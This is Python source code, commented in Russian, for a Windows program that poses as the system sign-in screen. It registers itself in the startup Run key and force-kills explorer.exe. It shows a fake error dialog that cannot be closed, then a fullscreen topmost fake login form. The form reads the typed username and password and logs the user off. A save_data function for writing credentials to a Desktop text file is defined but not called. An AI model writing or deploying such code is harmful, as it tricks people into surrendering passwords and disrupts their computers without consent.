import os
import ctypes
import tkinter
from tkinter import messagebox
import subprocess
import winreg
import sys
from PIL import ImageTk, Image
from screeninfo import get_monitors
import base64
from io import BytesIO
from codes import *

def encode_image(name): # Функция для декодирования изображений
    base64_data = name # Записывает код изображения
    binary_data = base64.b64decode(base64_data) # Декодирует изображение
    image = Image.open(BytesIO(binary_data)) # Создаёт объект-изображенние
    return image

def create_login_window():
    def on_submit():
        username = username_entry.get()
        password = password_entry.get()
        messagebox.showerror("Ошибка", "Неверные данные")
        ctypes.windll.user32.ExitWindowsEx(0, 0) # Завершает сеанс пользователся


    def on_focus_in(event):
        event.widget.config(bg='white', fg='#1c1c1c')  # Меняет цвет полоски ввода, когда её выделаешь

    def on_focus_out(event):
        event.widget.config(bg='#1c1c1c', fg='#525252') # Меняет цвет полоски ввода, когда убираешь выделение

    def on_press(event):
        event.widget.config(bg='#525252', fg='white')  # Цвета при нажатии на кнопки

    def on_release(event):
        event.widget.config(bg='#525252', fg='black') # Цвета, когда отпускаешь кнопку
    
    def get_keyboard_layout():
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
        layout_id = user32.GetKeyboardLayout(thread_id)
        return layout_id & 0xFFFF  # Младшее слово содержит код языка

    def update_language_label():
        lang_code = get_keyboard_layout()
        language = "РУС" if lang_code == 0x0419 else "ENG"  # 0x0419 - русский
        canvas.itemconfig(lang_label, text=f"{language}")
        root.after(100, update_language_label)  # Обновляем каждые 100 мс

    for monitor in get_monitors(): # При помощи библиотеки получаем разрешения монитора
        width = monitor.width 
        height = monitor.height

    root = tkinter.Tk() # Создание основного окна программы
    root.title("Вход в систему") # Заголовок (Его не видно по сути)
    root.geometry(f"{width}x{height}") # Разрешения окна
    root.attributes('-fullscreen', True) # Делает окно во весь экран
    root.attributes('-topmost', True) # Делает окно во весь экран
       
    image = encode_image(image_64) # Декодирует изображение 
    ratio = float(width / height) # Находим соотношение стором экрана
    image = image.resize((width, int(width / ratio))) # Подгоняем изображение под экран
    image = ImageTk.PhotoImage(image) # Создаём объект PhotoImage (чтобы потом разместить изображение)

    logo = encode_image(logo_64) # Декодирует изображение 
    logo = logo.resize((int(height * 0.2), int(height * 0.2))) # Меняем размер изображение в зависимости от размера экрана
    logo = ImageTk.PhotoImage(logo) # Создаём объект PhotoImage (чтобы потом разместить изображение)

    lan = encode_image(lan_64) 
    lan = lan.resize((int(height * 0.04), int(height * 0.04))) 
    lan = ImageTk.PhotoImage(lan) 
    spec = encode_image(spec_64) 
    spec = spec.resize((int(height * 0.04), int(height * 0.04))) 
    spec = ImageTk.PhotoImage(spec) 

    power = encode_image(power_64) 
    power = power.resize((int(height * 0.04), int(height * 0.04))) 
    power = ImageTk.PhotoImage(power) 

    username_placeholder = "  Username" # Создаём текст который будет написан пока пользователь не начнёт вводить данные
    password_placeholder = "  Password"

    canvas = tkinter.Canvas(root, highlightthickness=0) # Создаём холст на котором будем фон и в котором будут все объекты
    canvas.pack(side="top", fill="both", expand="yes") # Размещаем холст

    canvas.create_image(width // 2, height // 2, anchor="center", image=image) # Размещаем все изображения
    canvas.create_image(width // 2, height * 0.38, anchor="center", image=logo)
    canvas.create_image(width * 0.87, height * 0.95, anchor="center", image=lan)
    canvas.create_image(width * 0.91, height * 0.95, anchor="center", image=spec)
    canvas.create_image(width * 0.95, height * 0.95, anchor="center", image=power)

    username_entry = tkinter.Entry( 
        root, 
        highlightthickness=1, 
        highlightcolor="#525252",            # Создаём поля ввода логина
        highlightbackground="#525252",
        relief='solid',
        )
    
    password_entry = tkinter.Entry(
        root, 
        highlightthickness=1, 
        highlightcolor="#525252",            # Создаём поля ввода пароля  
        highlightbackground="#525252",
        relief='solid',
        )
    
    username_entry.insert(0, username_placeholder) # Размещаем начальный текст
    password_entry.insert(0, password_placeholder)

    username_entry.bind('<FocusIn>', lambda e: [on_focus_in(e), username_entry.delete(0, "end") if username_entry.get() == username_placeholder else None]) # Функции для удаления начального текста, когда пользователь выделает окно и чтобы окно меняло цвет при выделении
    username_entry.bind('<FocusOut>', lambda e: [on_focus_out(e), username_entry.insert(0, username_placeholder) if not username_entry.get() else None])
                                                                                                                                                                
    password_entry.bind('<FocusIn>', lambda e: [on_focus_in(e), password_entry.delete(0, "end") if password_entry.get() == password_placeholder else None])
    password_entry.bind('<FocusOut>', lambda e: [on_focus_out(e), password_entry.insert(0, password_placeholder) if not password_entry.get() else None])

    canvas.create_window((width // 2, height * 0.55), anchor="center", window=username_entry, width=int(width * 0.2), height=int(height // 30)) # Размещяем поля ввода на холсте
    canvas.create_window((width // 2, height * 0.59), anchor="center", window=password_entry, width=int(width * 0.2), height=int(height // 30))
    canvas.create_text((width // 2, height * 0.5), anchor="center", text="Другой пользователь", fill="White", font="Segoe 14") # Размещаем текст на холсте

    lang_label = canvas.create_text((width * 0.83, height * 0.95), anchor="center", text="РУС", fill="White", font="Segoe 12") # Создаём поле для отображения языка

    submit_button = tkinter.Button(
        root, 
        text=">", 
        command=on_submit,
        bg="#525252",                   # Создаём кнопку
        bd=0,
        relief='flat'
        )
    
    submit_button.bind('<ButtonPress>', on_press)      # Бинды чтобы кнопка меняла цвет
    submit_button.bind('<ButtonRelease>', on_release)

    canvas.create_window((width // 1.7, height * 0.59), anchor="center", window=submit_button, width=int(height // 30), height=int(height // 30)) # Размещаем кнопку на холсте

    root.after(100, lambda: password_entry.focus_set()) # Эти строчки - костыль, чтобы при запуске окна одно поле ввода изменило цвет
    root.after(300, lambda: username_entry.focus_set()) 

    root.bind('<Return>', lambda event: on_submit()) # Бинд кнопки ввода на enter

    update_language_label() # Функция которая чекает какой язык клавиатуры сейчас и отображает его 
    root.mainloop() # Запускает окно


def create_error_window():
    root = tkinter.Tk()
    root.title("Ошибка")
    root.resizable(False, False)

    def on_click():
        root.destroy()  # Затем гарантированно закрываем текущее окно
        create_login_window()
        root.quit()    # Дополнительно завершаем mainloop
    
    # Отключаем закрытие окна через крестик или Alt+F4
    root.protocol('WM_DELETE_WINDOW', lambda: None)
    
    # Убираем стандартные кнопки свернуть/закрыть
    root.attributes('-toolwindow', True)
    
    # Иконка ошибки (красный круг с крестиком)
    icon_label = tkinter.Label(root, text="ⓧ", fg="red", font=("Segoe UI", 24))
    icon_label.grid(row=0, column=0, padx=15, pady=15, sticky="n")
    
    # Основной текст ошибки
    error_text = tkinter.Label(root, text="Произошла ошибка в приложении", font=("Segoe UI", 12))
    error_text.grid(row=0, column=1, padx=5, pady=5, sticky="w")
    
    # Дополнительная информация
    detail_text = tkinter.Label(root, text="Код ошибки: 0x80070005\nДополнительная информация: Отказано в доступе", 
                          font=("Segoe UI", 9), justify="left")
    detail_text.grid(row=1, column=1, padx=5, pady=5, sticky="w")
    
    # Кнопки
    button_frame = tkinter.Frame(root)
    button_frame.grid(row=2, column=0, columnspan=2, pady=10)
    
    ok_button = tkinter.Button(button_frame, text="OK", width=10, command=on_click)
    ok_button.pack(side="right", padx=5)
    
    # Делаем окно поверх всех остальных
    root.attributes('-topmost', True)
    
    # Центрирование окна
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'+{x}+{y}')
    
    root.mainloop()

def add_to_startup():

    exe_path = os.path.abspath(sys.argv[0]) # Путь к файлу
    
    app_name = os.path.splitext(os.path.basename(exe_path))[0] # Имя программы (без .exe)
    
    key = winreg.HKEY_CURRENT_USER
    key_path = 'Software\Microsoft\Windows\CurrentVersion\Run'
    
    # Открываем ключ автозагрузки
    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
        # Проверяем, есть ли уже запись
        try:
            existing_value = winreg.QueryValueEx(reg_key, app_name)
            return
        except:
            winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, exe_path)

def save_data(username, password):

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop") # Получает путь до рабочего стола
    file_path = os.path.join(desktop_path, "data.txt")  # Добавляет в путь название файла

    with open(file_path, 'a+') as file:
        file.write(f"Username: {username}, Password: {password}\n") # Записывает в файл данные

def reg_variable(key, value_name):
    try:
        value_data, value_type = winreg.QueryValueEx(key, value_name) # Пытается взять значение созданной переменной
        return value_data
    except:
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0) # Создаёт переменную (при первом запуске)
        value_data = 0 # Начальное значение переменной
        return value_data

def main():
    key_path = "Console\Variables" # Путь до переменной
    value_name = "main" # Название переменной
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) # Открывает реестр по пути до переменной

    add_to_startup()

    if reg_variable(key, value_name) == 0: # Чередует запуск программы
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 1)
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], shell=False)
        create_error_window()
    else:
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
    
    winreg.CloseKey(key) # Закрывает реест по пути до переменной

main()